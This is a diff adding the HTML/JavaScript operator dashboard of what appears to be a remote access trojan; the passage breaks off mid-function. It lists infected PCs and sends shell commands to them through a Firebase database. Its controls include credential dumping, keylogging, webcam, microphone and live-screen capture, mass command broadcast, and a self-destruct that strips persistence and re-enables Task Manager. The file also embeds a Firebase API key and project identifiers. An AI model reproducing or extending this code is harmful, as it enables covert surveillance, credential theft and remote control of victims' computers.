@@ -1,0 +1,992 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Dashboard</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:#0d1117; color:#c9d1d9; font-family:'Consolas','Courier New',monospace; height:100vh; display:flex; flex-direction:column; overflow:hidden; }
+  .hidden { display:none !important; }
+
+  .login-screen { position:fixed; inset:0; background:#0d1117; display:flex; align-items:center; justify-content:center; z-index:999; }
+  .login-box { background:#161b22; border:1px solid #30363d; border-radius:8px; padding:32px; width:380px; }
+  .login-box h1 { color:#58a6ff; font-size:20px; margin-bottom:20px; }
+  .login-box input { width:100%; background:#0d1117; border:1px solid #30363d; color:#c9d1d9; padding:10px 12px; border-radius:6px; font-family:inherit; font-size:13px; margin-bottom:10px; outline:none; }
+  .login-box input:focus { border-color:#58a6ff; }
+  .login-box button { width:100%; background:#238636; border:none; color:#fff; padding:10px; border-radius:6px; cursor:pointer; font-family:inherit; font-size:13px; font-weight:bold; }
+  .login-box button:hover { background:#2ea043; }
+  .login-box .err { color:#f85149; font-size:12px; margin-top:10px; min-height:16px; }
+  .login-box .hint { color:#8b949e; font-size:11px; margin-top:14px; text-align:center; }
+
+  .topbar { background:#161b22; border-bottom:1px solid #30363d; padding:10px 16px; display:flex; justify-content:space-between; align-items:center; }
+  .topbar .title { color:#58a6ff; font-weight:bold; }
+  .topbar .right { display:flex; gap:12px; align-items:center; font-size:12px; }
+  .topbar .user { color:#8b949e; }
+  .topbar .logout { color:#f85149; cursor:pointer; padding:2px 8px; border:1px solid #f85149; border-radius:4px; }
+  .topbar .status { color:#3fb950; font-size:12px; }
+  .topbar .status::before { content:'● '; animation:pulse 1.5s infinite; }
+  .topbar .status.off { color:#f85149; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
+  .topbar .menu-btn { background:#21262d; border:1px solid #30363d; color:#c9d1d9; padding:4px 10px; border-radius:4px; cursor:pointer; font-size:12px; }
+  .topbar .menu-btn:hover { border-color:#58a6ff; color:#58a6ff; }
+
+  .menu-panel { position:fixed; top:48px; right:16px; background:#161b22; border:1px solid #30363d; border-radius:6px; padding:8px 0; min-width:280px; z-index:200; box-shadow:0 8px 24px rgba(0,0,0,0.6); display:none; max-height:80vh; overflow-y:auto; }
+  .menu-panel.open { display:block; }
+  .menu-panel .menu-title { padding:6px 14px; font-size:10px; color:#8b949e; text-transform:uppercase; letter-spacing:1px; }
+  .menu-panel .menu-item { padding:8px 14px; font-size:12px; color:#c9d1d9; cursor:pointer; display:flex; align-items:center; gap:8px; }
+  .menu-panel .menu-item:hover { background:#21262d; color:#58a6ff; }
+  .menu-panel .menu-item .key { margin-left:auto; font-size:10px; color:#8b949e; background:#0d1117; padding:1px 6px; border-radius:3px; border:1px solid #30363d; }
+  .menu-panel .menu-sep { height:1px; background:#30363d; margin:4px 0; }
+  .menu-panel .menu-item.danger { color:#f85149; }
+  .menu-panel .menu-item.danger:hover { background:#2d1414; color:#f85149; }
+
+  .main { flex:1; display:flex; overflow:hidden; }
+  .sidebar { width:260px; background:#161b22; border-right:1px solid #30363d; display:flex; flex-direction:column; overflow:hidden; }
+  .sidebar-header { padding:10px 16px; font-size:11px; color:#8b949e; text-transform:uppercase; letter-spacing:1px; border-bottom:1px solid #30363d; display:flex; justify-content:space-between; align-items:center; }
+  .sidebar-header .count { background:#238636; color:#fff; padding:1px 8px; border-radius:10px; font-size:10px; }
+  .pc-list { flex:1; overflow-y:auto; }
+  .pc-item { padding:10px 16px; cursor:pointer; border-left:3px solid transparent; border-bottom:1px solid #21262d; }
+  .pc-item:hover { background:#21262d; }
+  .pc-item.active { border-left-color:#58a6ff; background:#21262d; }
+  .pc-item.selected { border-left-color:#d29922; background:#2d2412; }
+  .pc-item .pc-row { display:flex; align-items:center; gap:6px; }
+  .pc-item input[type=checkbox] { accent-color:#58a6ff; cursor:pointer; }
+  .pc-item .pc-name { color:#c9d1d9; font-size:13px; font-weight:bold; flex:1; }
+  .pc-item.active .pc-name { color:#58a6ff; }
+  .pc-item .pc-meta { color:#8b949e; font-size:11px; margin-top:3px; }
+  .pc-item .dot { width:8px; height:8px; border-radius:50%; background:#3fb950; box-shadow:0 0 6px #3fb950; }
+  .pc-item .dot.offline { background:#f85149; box-shadow:0 0 6px #f85149; }
+
+  .content { flex:1; display:flex; flex-direction:column; overflow:hidden; }
+  .tabs { display:flex; background:#161b22; border-bottom:1px solid #30363d; overflow-x:auto; }
+  .tab { padding:8px 14px; font-size:12px; color:#8b949e; cursor:pointer; border-bottom:2px solid transparent; white-space:nowrap; }
+  .tab:hover { color:#c9d1d9; }
+  .tab.active { color:#58a6ff; border-bottom-color:#58a6ff; }
+
+  .terminal { flex:1; background:#0d1117; padding:12px; overflow-y:auto; font-size:13px; line-height:1.5; white-space:pre-wrap; word-break:break-all; }
+  .terminal .line { margin-bottom:2px; }
+  .terminal .prompt { color:#58a6ff; }
+  .terminal .error { color:#f85149; }
+  .terminal .success { color:#3fb950; }
+  .terminal .warn { color:#d29922; }
+  .terminal .info { color:#8b949e; }
+  .terminal img { max-width:100%; max-height:400px; border:1px solid #30363d; border-radius:4px; margin:4px 0; }
+  .terminal video { max-width:100%; max-height:400px; border:1px solid #58a6ff; border-radius:4px; }
+
+  .inputbar { display:flex; background:#161b22; border-top:1px solid #30363d; padding:8px 12px; align-items:center; gap:6px; flex-wrap:wrap; }
+  .inputbar .prefix { color:#58a6ff; margin-right:8px; }
+  .inputbar input[type=text] { flex:1; min-width:200px; background:transparent; border:none; outline:none; color:#c9d1d9; font-family:inherit; font-size:13px; }
+  .action-btn { background:#21262d; border:1px solid #30363d; color:#c9d1d9; padding:6px 10px; border-radius:6px; cursor:pointer; font-family:inherit; font-size:11px; display:flex; align-items:center; gap:4px; }
+  .action-btn:hover { background:#30363d; border-color:#58a6ff; }
+  .action-btn:active { transform:scale(0.95); }
+  .action-btn:disabled { opacity:0.4; cursor:not-allowed; }
+  .action-btn.recording { background:#da3633; border-color:#f85149; color:#fff; animation:pulse 1s infinite; }
+  .action-btn.talking { background:#238636; border-color:#3fb950; color:#fff; animation:pulse 1s infinite; }
+  .action-btn.watching { background:#1f6feb; border-color:#58a6ff; color:#fff; animation:pulse 1s infinite; }
+  .action-btn.broadcast { background:#6e40c9; border-color:#8957e5; color:#fff; }
+  .action-btn.kill { background:#5a1e1e; border-color:#f85149; color:#fff; }
+  .action-btn.kill:hover { background:#7a2828; }
+
+  .footer { background:#161b22; border-top:1px solid #30363d; padding:6px 12px; font-size:11px; color:#8b949e; display:flex; justify-content:space-between; }
+
+  .metrics { display:flex; gap:12px; padding:8px 12px; background:#161b22; border-bottom:1px solid #30363d; font-size:11px; flex-wrap:wrap; }
+  .metric { background:#0d1117; border:1px solid #30363d; padding:4px 10px; border-radius:4px; color:#8b949e; }
+  .metric span { color:#58a6ff; }
+
+  ::-webkit-scrollbar { width:8px; height:8px; }
+  ::-webkit-scrollbar-track { background:#0d1117; }
+  ::-webkit-scrollbar-thumb { background:#30363d; border-radius:4px; }
+
+  .empty { color:#8b949e; text-align:center; padding:20px; font-style:italic; }
+
+  .live-panel { position:fixed; bottom:60px; right:20px; width:420px; max-height:420px; background:#161b22; border:1px solid #58a6ff; border-radius:8px; overflow:hidden; display:none; flex-direction:column; box-shadow:0 8px 32px rgba(88,166,255,0.3); z-index:100; }
+  .live-panel.open { display:flex; }
+  .live-header { background:#0d1117; padding:8px 12px; font-size:12px; color:#58a6ff; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #30363d; }
+  .live-header .close { cursor:pointer; color:#f85149; font-weight:bold; }
+  .live-body { flex:1; padding:10px; overflow-y:auto; font-size:12px; line-height:1.6; }
+  .live-body img { max-width:100%; border-radius:4px; }
+  .live-body .bubble { background:#21262d; border-left:3px solid #58a6ff; padding:6px 10px; margin-bottom:6px; border-radius:4px; }
+  .live-body .bubble.sys { border-left-color:#3fb950; color:#8b949e; }
+
+  .toast { position:fixed; top:60px; right:20px; background:#21262d; border:1px solid #30363d; border-left:3px solid #58a6ff; color:#c9d1d9; padding:10px 16px; border-radius:4px; font-size:12px; z-index:1000; opacity:0; transition:opacity 0.3s; }
+  .toast.show { opacity:1; }
+  .toast.err { border-left-color:#f85149; }
+  .toast.ok { border-left-color:#3fb950; }
+
+  .modal { position:fixed; inset:0; background:rgba(0,0,0,0.7); display:none; align-items:center; justify-content:center; z-index:500; }
+  .modal.open { display:flex; }
+  .modal-box { background:#161b22; border:1px solid #f85149; border-radius:8px; padding:24px; width:440px; max-width:90vw; }
+  .modal-box h2 { color:#f85149; margin-bottom:12px; font-size:16px; }
+  .modal-box p { color:#c9d1d9; font-size:12px; margin-bottom:8px; line-height:1.6; }
+  .modal-box ul { color:#8b949e; font-size:12px; margin:8px 0 16px 20px; }
+  .modal-box li { margin-bottom:3px; }
+  .modal-box .btns { display:flex; gap:8px; justify-content:flex-end; margin-top:16px; }
+  .modal-box button { padding:8px 16px; border-radius:4px; cursor:pointer; font-family:inherit; font-size:12px; border:1px solid; }
+  .modal-box .cancel { background:#21262d; border-color:#30363d; color:#c9d1d9; }
+  .modal-box .confirm { background:#7a2828; border-color:#f85149; color:#fff; font-weight:bold; }
+  .modal-box .confirm:hover { background:#a03030; }
+</style>
+</head>
+<body>
+
+<div class="login-screen" id="loginScreen">
+  <div class="login-box">
+    <h1>⚡ SYSTEM DASHBOARD</h1>
+    <input type="email" id="loginEmail" placeholder="operator@bzana.local" autocomplete="username">
+    <input type="password" id="loginPass" placeholder="Password" autocomplete="current-password">
+    <button id="loginBtn">Login</button>
+    <div class="err" id="loginErr"></div>
+    <div class="hint">Authorized personnel only</div>
+  </div>
+</div>
+
+<div id="dashApp" class="hidden" style="display:flex;flex-direction:column;height:100vh;">
+<div class="topbar">
+  <div class="title">⚡ SYSTEM DASHBOARD</div>
+  <div class="right">
+    <span class="menu-btn" id="menuBtn">☰ Menu</span>
+    <span class="user" id="userLabel">-</span>
+    <span class="status" id="connStatus">CONNECTING</span>
+    <span class="logout" id="logoutBtn">Logout</span>
+  </div>
+</div>
+
+<div class="menu-panel" id="menuPanel">
+  <div class="menu-title">Navigation</div>
+  <div class="menu-item" data-tab="cmd">💻 CMD Shell <span class="key">1</span></div>
+  <div class="menu-item" data-tab="ps">⚙ PowerShell <span class="key">2</span></div>
+  <div class="menu-item" data-tab="sys">🖥 System Info <span class="key">3</span></div>
+  <div class="menu-item" data-tab="proc">📊 Processes <span class="key">4</span></div>
+  <div class="menu-item" data-tab="net">🌐 Network <span class="key">5</span></div>
+  <div class="menu-item" data-tab="files">📁 Files <span class="key">6</span></div>
+  <div class="menu-item" data-tab="creds">🔑 Credentials <span class="key">7</span></div>
+  <div class="menu-item" data-tab="keylog">⌨ Keylog <span class="key">8</span></div>
+  <div class="menu-item" data-tab="webcam">📷 Webcam <span class="key">9</span></div>
+  <div class="menu-item" data-tab="logs">📜 Logs <span class="key">0</span></div>
+  <div class="menu-sep"></div>
+  <div class="menu-title">Actions</div>
+  <div class="menu-item" id="miScreenshot">📸 Screenshot <span class="key">S</span></div>
+  <div class="menu-item" id="miWatch">🖥 Live Screen <span class="key">W</span></div>
+  <div class="menu-item" id="miMic">🔊 Remote Mic <span class="key">M</span></div>
+  <div class="menu-item" id="miWebcam">📷 Webcam <span class="key">C</span></div>
+  <div class="menu-item" id="miCreds">🔑 Dump Creds <span class="key">D</span></div>
+  <div class="menu-item" id="miKeylog">⌨ Toggle Keylog <span class="key">K</span></div>
+  <div class="menu-item" id="miTalk">🎤 Hold to Talk <span class="key">T</span></div>
+  <div class="menu-item" id="miInfo">ℹ Refresh Info <span class="key">I</span></div>
+  <div class="menu-sep"></div>
+  <div class="menu-title">Danger Zone</div>
+  <div class="menu-item" id="miBroadcast" style="color:#8957e5">📡 Broadcast <span class="key">B</span></div>
+  <div class="menu-item danger" id="miKill">💀 Self-Destruct <span class="key">X</span></div>
+</div>
+
+<div class="metrics">
+  <div class="metric">HOST: <span id="mHost">-</span></div>
+  <div class="metric">USER: <span id="mUser">-</span></div>
+  <div class="metric">OS: <span id="mOS">-</span></div>
+  <div class="metric">IP: <span id="mIP">-</span></div>
+  <div class="metric">UPTIME: <span id="mUptime">-</span></div>
+  <div class="metric">SELECTED: <span id="mSelected">0</span></div>
+</div>
+
+<div class="main">
+  <div class="sidebar">
+    <div class="sidebar-header">
+      <span>Connected PCs</span>
+      <span class="count" id="pcCount">0</span>
+    </div>
+    <div class="pc-list" id="pcList">
+      <div class="empty">Waiting for agents...</div>
+    </div>
+  </div>
+
+  <div class="content">
+    <div class="tabs">
+      <div class="tab active" data-tab="cmd">CMD</div>
+      <div class="tab" data-tab="ps">PowerShell</div>
+      <div class="tab" data-tab="sys">System</div>
+      <div class="tab" data-tab="proc">Processes</div>
+      <div class="tab" data-tab="net">Network</div>
+      <div class="tab" data-tab="files">Files</div>
+      <div class="tab" data-tab="creds">Credentials</div>
+      <div class="tab" data-tab="keylog">Keylog</div>
+      <div class="tab" data-tab="webcam">Webcam</div>
+      <div class="tab" data-tab="logs">Logs</div>
+    </div>
+
+    <div class="terminal" id="terminal"></div>
+    <div class="inputbar">
+      <span class="prefix" id="promptPrefix">C:\&gt;</span>
+      <input type="text" id="cmdInput" autocomplete="off" spellcheck="false" autofocus>
+      <button class="action-btn" id="btnTalk" title="Hold to Talk">🎤 Talk</button>
+      <button class="action-btn" id="btnWatch" title="Live Screen">🖥️ Watch</button>
+      <button class="action-btn" id="btnMic" title="Listen Mic">🔊 Listen</button>
+      <button class="action-btn" id="btnShot" title="Screenshot">📸 Shot</button>
+      <button class="action-btn" id="btnWebcam" title="Webcam">📷 Cam</button>
+      <button class="action-btn" id="btnKeylog" title="Keylogger">⌨️ Keylog</button>
+      <button class="action-btn" id="btnCreds" title="Dump Credentials">🔑 Creds</button>
+      <button class="action-btn broadcast" id="btnBroadcast" title="Broadcast to selected PCs">📡 Broadcast</button>
+      <button class="action-btn kill" id="btnKill" title="Self-Destruct Agent">💀 Kill</button>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  <span id="footerLeft">Session: active</span>
+  <span id="footerRight">Operator: <span id="footUser">-</span></span>
+</div>
+</div>
+
+<div class="live-panel" id="livePanel">
+  <div class="live-header">
+    <span id="liveTitle">🎥 Live Session</span>
+    <span class="close" id="liveClose">✕</span>
+  </div>
+  <div class="live-body" id="liveBody"></div>
+</div>
+
+<div class="modal" id="killModal">
+  <div class="modal-box">
+    <h2>💀 SELF-DESTRUCT CONFIRMATION</h2>
+    <p>You are about to permanently terminate the agent on <strong id="killTarget">-</strong>.</p>
+    <p>The agent will:</p>
+    <ul>
+      <li>Delete itself from disk</li>
+      <li>Remove all persistence (registry, startup, scheduled task)</li>
+      <li>Wipe all Firebase data associated with this agent</li>
+      <li>Re-enable Task Manager and Windows keys</li>
+      <li>Terminate its own process</li>
+    </ul>
+    <p style="color:#f85149">This action cannot be undone.</p>
+    <div class="btns">
+      <button class="cancel" id="killCancel">Cancel</button>
+      <button class="confirm" id="killConfirm">SELF-DESTRUCT</button>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getAuth, signInWithEmailAndPassword, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+import { getDatabase, ref, onValue, set, push, remove, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyC-k6K40XNo1-9mSwB6kjxqTwJ_oHKMjsk",
+  authDomain: "bzana-1fade.firebaseapp.com",
+  databaseURL: "https://bzana-1fade-default-rtdb.firebaseio.com",
+  projectId: "bzana-1fade",
+  storageBucket: "bzana-1fade.firebasestorage.app",
+  messagingSenderId: "351334124183",
+  appId: "1:351334124183:web:b2a48592b5ba64f77eb7d2"
+};
+
+const app = initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db = getDatabase(app);
+
+const term = document.getElementById('terminal');
+const input = document.getElementById('cmdInput');
+const promptPrefix = document.getElementById('promptPrefix');
+const connStatus = document.getElementById('connStatus');
+const pcListEl = document.getElementById('pcList');
+const pcCountEl = document.getElementById('pcCount');
+const livePanel = document.getElementById('livePanel');
+const liveBody = document.getElementById('liveBody');
+const liveTitle = document.getElementById('liveTitle');
+const menuPanel = document.getElementById('menuPanel');
+const killModal = document.getElementById('killModal');
+
+const MAX_LINES = 500;
+const PRINTED_CAP = 2000;
+const printedIds = new Set();
+const printedOrder = [];
+
+let currentUser = null, currentRole = null;
+let activePC = null, activeTab = 'cmd', cwd = 'C:\\', pcs = {};
+let selectedPCs = new Set();
+let unsubOutput = null, unsubLive = null, unsubAgents = null;
+let liveImg = null;
+let watchInterval = null, listenInterval = null, keylogActive = false;
+let mediaRecorder = null, audioChunks = [], talkStream = null;
+let renderedIds = new Set();
+let toastQueue = [];
+let toastBusy = false;
+
+// ============================================================
+// Toast queue
+// ============================================================
+function toast(msg, cls = '') {
+  toastQueue.push({ msg, cls });
+  if (!toastBusy) showNextToast();
+}
+function showNextToast() {
+  if (!toastQueue.length) { toastBusy = false; return; }
+  toastBusy = true;
+  const { msg, cls } = toastQueue.shift();
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast show ' + cls;
+  setTimeout(() => {
+    t.className = 'toast ' + cls;
+    setTimeout(showNextToast, 300);
+  }, 2000);
+}
+
+// ============================================================
+// Terminal helpers
+// ============================================================
+function capTerm() {
+  while (term.children.length > MAX_LINES) term.removeChild(term.firstChild);
+}
+function log(text, cls = '') {
+  const d = document.createElement('div');
+  d.className = 'line ' + cls;
+  d.textContent = text;
+  term.appendChild(d);
+  capTerm();
+  term.scrollTop = term.scrollHeight;
+}
+function logImage(b64) {
+  const d = document.createElement('div');
+  d.className = 'line';
+  const i = document.createElement('img');
+  i.src = 'data:image/jpeg;base64,' + b64;
+  i.onload = () => { capTerm(); term.scrollTop = term.scrollHeight; };
+  d.appendChild(i);
+  term.appendChild(d);
+  capTerm();
+}
+function logVideo(b64) {
+  const d = document.createElement('div');
+  d.className = 'line';
+  const v = document.createElement('video');
+  v.src = 'data:video/webm;base64,' + b64;
+  v.controls = true;
+  d.appendChild(v);
+  term.appendChild(d);
+  capTerm();
+}
+function logFileLink(name, b64) {
+  const d = document.createElement('div');
+  d.className = 'line success';
+  d.appendChild(document.createTextNode('📎 '));
+  const a = document.createElement('a');
+  a.href = 'data:application/octet-stream;base64,' + b64;
+  a.download = name;
+  a.textContent = name;
+  a.style.color = '#58a6ff';
+  d.appendChild(a);
+  term.appendChild(d);
+  capTerm();
+}
+function clearTerm() { term.innerHTML = ''; printedIds.clear(); printedOrder.length = 0; }
+
+function markPrinted(id) {
+  printedIds.add(id);
+  printedOrder.push(id);
+  while (printedOrder.length > PRINTED_CAP) {
+    printedIds.delete(printedOrder.shift());
+  }
+}
+
+// ============================================================
+// Auth
+// ============================================================
+const loginBtn = document.getElementById('loginBtn');
+const loginEmail = document.getElementById('loginEmail');
+const loginPass = document.getElementById('loginPass');
+const loginErr = document.getElementById('loginErr');
+
+loginBtn.addEventListener('click', doLogin);
+loginPass.addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); });
+loginEmail.addEventListener('keydown', e => { if (e.key === 'Enter') loginPass.focus(); });
+
+async function doLogin() {
+  loginErr.textContent = '';
+  const email = loginEmail.value.trim();
+  const pass = loginPass.value;
+  if (!email || !pass) { loginErr.textContent = 'Email and password required'; return; }
+  loginBtn.disabled = true;
+  loginBtn.textContent = 'Signing in...';
+  try {
+    const cred = await signInWithEmailAndPassword(auth, email, pass);
+    await loadUserRole(cred.user.uid);
+  } catch (e) {
+    loginErr.textContent = e.code === 'auth/invalid-credential' ? 'Invalid credentials' : (e.message || 'Login failed');
+  } finally {
+    loginBtn.disabled = false;
+    loginBtn.textContent = 'Login';
+  }
+}
+
+async function loadUserRole(uid) {
+  try {
+    const snap = await get(ref(db, `users/${uid}/role`));
+    currentRole = snap.val();
+    if (!currentRole) { loginErr.textContent = 'Account has no role assigned'; await signOut(auth); return; }
+  } catch (e) {
+    loginErr.textContent = 'Cannot read role: ' + e.message;
+    await signOut(auth);
+    return;
+  }
+  currentUser = auth.currentUser.email;
+  showDashboard();
+}
+
+function showDashboard() {
+  document.getElementById('loginScreen').classList.add('hidden');
+  document.getElementById('dashApp').classList.remove('hidden');
+  document.getElementById('userLabel').textContent = currentUser + ' (' + currentRole + ')';
+  document.getElementById('footUser').textContent = currentUser;
+  if (currentRole === 'viewer') {
+    input.disabled = true;
+    document.querySelectorAll('.action-btn').forEach(b => b.disabled = true);
+    document.querySelectorAll('.menu-item[id^="mi"]').forEach(b => b.style.pointerEvents = 'none');
+  }
+  startDashboard();
+}
+
+document.getElementById('logoutBtn').addEventListener('click', async () => {
+  try { await signOut(auth); } catch (e) {}
+  sessionStorage.clear();
+  location.reload();
+});
+
+onAuthStateChanged(auth, async user => {
+  if (user) {
+    await loadUserRole(user.uid);
+  } else {
+    document.getElementById('loginScreen').classList.remove('hidden');
+    document.getElementById('dashApp').classList.add('hidden');
+  }
+});
+
+// ============================================================
+// Dashboard
+// ============================================================
+function startDashboard() {
+  // --- Sidebar render (incremental) ---
+  function renderPCs() {
+    const ids = Object.keys(pcs).filter(id => pcs[id].online);
+    pcCountEl.textContent = ids.length;
+
+    // Only re-render if set of ids changed or selection changed
+    const newKey = ids.join(',') + '|' + Array.from(selectedPCs).join(',');
+    if (renderPCs._lastKey === newKey && activePC === renderPCs._lastActive) return;
+    renderPCs._lastKey = newKey;
+    renderPCs._lastActive = activePC;
+
+    pcListEl.innerHTML = '';
+    if (!ids.length) { pcListEl.innerHTML = '<div class="empty">Waiting for agents...</div>'; document.getElementById('mSelected').textContent = selectedPCs.size; return; }
+    ids.forEach(id => {
+      const pc = pcs[id];
+      const d = document.createElement('div');
+      d.className = 'pc-item' + (activePC === id ? ' active' : '') + (selectedPCs.has(id) ? ' selected' : '');
+      const row = document.createElement('div');
+      row.className = 'pc-row';
+      const cb = document.createElement('input');
+      cb.type = 'checkbox';
+      cb.checked = selectedPCs.has(id);
+      cb.addEventListener('change', e => {
+        if (e.target.checked) selectedPCs.add(id); else selectedPCs.delete(id);
+        document.getElementById('mSelected').textContent = selectedPCs.size;
+        renderPCs._lastKey = null;
+        renderPCs();
+      });
+      const name = document.createElement('span');
+      name.className = 'pc-name';
+      name.textContent = pc.hostname || id;
+      const dot = document.createElement('span');
+      dot.className = 'dot' + (pc.online ? '' : ' offline');
+      row.appendChild(cb); row.appendChild(name); row.appendChild(dot);
+      d.appendChild(row);
+      const m1 = document.createElement('div');
+      m1.className = 'pc-meta';
+      m1.textContent = (pc.username || 'unknown') + ' · ' + (pc.ip || 'no-ip');
+      const m2 = document.createElement('div');
+      m2.className = 'pc-meta';
+      m2.textContent = pc.os || 'unknown OS';
+      d.appendChild(m1); d.appendChild(m2);
+      d.addEventListener('click', e => { if (e.target.tagName === 'INPUT') return; selectPC(id); });
+      pcListEl.appendChild(d);
+    });
+    document.getElementById('mSelected').textContent = selectedPCs.size;
+  }
+
+  async function selectPC(id) {
+    if (activePC === id) return;
+    activePC = id;
+    const pc = pcs[id] || {};
+    document.getElementById('mHost').textContent = pc.hostname || id;
+    document.getElementById('mUser').textContent = pc.username || '-';
+    document.getElementById('mOS').textContent = pc.os || '-';
+    document.getElementById('mIP').textContent = pc.ip || '-';
+    document.getElementById('mUptime').textContent = pc.uptime || '-';
+    renderPCs._lastKey = null;
+    renderPCs();
+    clearTerm();
+    log('=========================================', 'info');
+    log(`  Attached to: ${pc.hostname || id}`, 'success');
+    log(`  User: ${pc.username || '?'}  IP: ${pc.ip || '?'}`, 'info');
+    log('=========================================', 'info');
+    log('Type "help" for commands.', 'warn');
+    setPrompt();
+    subscribeOutput(id);
+    subscribeLive(id);
+  }
+
+  function subscribeAgents() {
+    if (unsubAgents) unsubAgents();
+    unsubAgents = onValue(ref(db, 'agents'), snap => {
+      pcs = snap.val() || {};
+      renderPCs();
+      if (!activePC && Object.keys(pcs).length) {
+        const f = Object.keys(pcs).find(id => pcs[id].online);
+        if (f) selectPC(f);
+      }
+      if (activePC && pcs[activePC]) {
+        const pc = pcs[activePC];
+        document.getElementById('mHost').textContent = pc.hostname || activePC;
+        document.getElementById('mUser').textContent = pc.username || '-';
+        document.getElementById('mOS').textContent = pc.os || '-';
+        document.getElementById('mIP').textContent = pc.ip || '-';
+        document.getElementById('mUptime').textContent = pc.uptime || '-';
+      }
+      if (activePC && !pcs[activePC]) {
+        log('[!] Agent went offline or was removed.', 'warn');
+        activePC = null;
+      }
+    });
+  }
+
+  function subscribeOutput(pcId) {
+    if (unsubOutput) { unsubOutput(); unsubOutput = null; }
+    printedIds.clear(); printedOrder.length = 0;
+    unsubOutput = onValue(ref(db, `output/${pcId}`), snap => {
+      const data = snap.val(); if (!data) return;
+      const entries = Object.entries(data)
+        .filter(([k]) => !printedIds.has(k))
+        .sort((a,b) => (a[1].timestamp || 0) - (b[1].timestamp || 0));
+      entries.forEach(([k, e]) => {
+        markPrinted(k);
+        const t = e.text || '';
+        if (t.startsWith('SCREENSHOT_B64:')) logImage(t.substring(15));
+        else if (t.startsWith('VIDEO_B64:')) logVideo(t.substring(10));
+        else if (t.startsWith('FILE_B64:')) {
+          const rest = t.substring(9);
+          const i = rest.indexOf(':');
+          if (i > 0) logFileLink(rest.substring(0, i), rest.substring(i + 1));
+        }
+        else if (e.type === 'error') log(t, 'error');
+        else if (e.type === 'success') log(t, 'success');
+        else if (e.type === 'info') log(t, 'info');
+        else log(t);
+      });
+    });
+  }
+
+  function subscribeLive(pcId) {
+    if (unsubLive) { unsubLive(); unsubLive = null; }
+    liveBody.innerHTML = '';
+    liveImg = null;
+    unsubLive = onValue(ref(db, `live/${pcId}`), snap => {
+      const d = snap.val(); if (!d) return;
+      if (d.frame) {
+        if (!liveImg) {
+          liveBody.innerHTML = '';
+          liveImg = document.createElement('img');
+          liveBody.appendChild(liveImg);
+        }
+        liveImg.src = 'data:image/jpeg;base64,' + d.frame;
+      }
+    });
+  }
+
+  onValue(ref(db, '.info/connected'), snap => {
+    const c = snap.val();
+    connStatus.textContent = c ? 'CONNECTED' : 'DISCONNECTED';
+    connStatus.classList.toggle('off', !c);
+  });
+
+  function setPrompt() {
+    const p = activeTab === 'ps' ? `PS ${cwd}>` : `${cwd}>`;
+    promptPrefix.textContent = activePC ? `[${activePC}] ${p}` : p;
+  }
+
+  function switchTab(tabName) {
+    document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
+    document.querySelectorAll(`.tab[data-tab="${tabName}"]`).forEach(x => x.classList.add('active'));
+    activeTab = tabName;
+    setPrompt();
+    if (!activePC) return;
+    if (tabName === 'sys') fetchSysInfo(activePC);
+    if (tabName === 'proc') fetchProcesses(activePC);
+    if (tabName === 'net') fetchNetwork(activePC);
+    if (tabName === 'files') fetchFiles(activePC);
+    if (tabName === 'creds') fetchCreds(activePC);
+    if (tabName === 'keylog') fetchKeylog(activePC);
+    if (tabName === 'webcam') fetchWebcam(activePC);
+    if (tabName === 'logs') fetchLogs(activePC);
+  }
+
+  document.querySelectorAll('.tab').forEach(el => {
+    el.addEventListener('click', () => switchTab(el.dataset.tab));
+  });
+
+  async function sendCommand(cmd, shell = null, target = null) {
+    const t = target || activePC;
+    if (!t) { log('[!] No PC selected.', 'error'); return; }
+    const cmdRef = push(ref(db, `commands/${t}`));
+    await set(cmdRef, { cmd, shell: shell || (activeTab === 'ps' ? 'powershell' : 'cmd'), cwd, timestamp: Date.now(), status: 'pending', operator: currentUser });
+  }
+
+  async function broadcast(cmd, shell = 'cmd') {
+    if (!selectedPCs.size) { toast('Select at least one PC', 'err'); return; }
+    const s = shell;
+    const jobs = Array.from(selectedPCs).map(id => sendCommand(cmd, s, id));
+    await Promise.all(jobs);
+    toast(`Broadcast to ${selectedPCs.size} PC(s)`, 'ok');
+    log(`[*] Broadcast to ${selectedPCs.size} PCs: ${cmd}`, 'success');
+  }
+
+  input.addEventListener('keydown', async e => {
+    if (e.key !== 'Enter') return;
+    const cmd = input.value.trim(); input.value = '';
+    if (!cmd) return;
+    if (!activePC) { log('[!] Select a PC first.', 'error'); return; }
+    log(promptPrefix.textContent + ' ' + cmd, 'prompt');
+    if (cmd === 'help') {
+      log('Local: help, clear, sysinfo, ps, net, refresh, exit', 'success');
+      log('Buttons: Talk, Watch, Listen, Shot, Cam, Keylog, Creds, Broadcast, Kill', 'info');
+      return;
+    }
+    if (cmd === 'clear') { clearTerm(); return; }
+    if (cmd === 'sysinfo') { fetchSysInfo(activePC); return; }
+    if (cmd === 'ps') { fetchProcesses(activePC); return; }
+    if (cmd === 'net') { fetchNetwork(activePC); return; }
+    if (cmd === 'refresh') { switchTab(activeTab); return; }
+    if (cmd.startsWith('cd ')) { cwd = cmd.substring(3).trim(); setPrompt(); return; }
+    if (cmd === 'exit') { log('[*] Detached.', 'warn'); if (unsubOutput) { unsubOutput(); unsubOutput=null; } if (unsubLive) { unsubLive(); unsubLive=null; } activePC = null; renderPCs._lastKey=null; renderPCs(); return; }
+    await sendCommand(cmd);
+  });
+
+  // ============================================================
+  // Action buttons
+  // ============================================================
+  document.getElementById('btnShot').addEventListener('click', async () => {
+    if (!activePC) return log('[!] Select a PC first.', 'error');
+    log('[*] Requesting screenshot...', 'info');
+    await sendCommand('SCREENSHOT', 'special');
+  });
+
+  const btnWatch = document.getElementById('btnWatch');
+  async function stopWatch() {
+    if (!watchInterval) return;
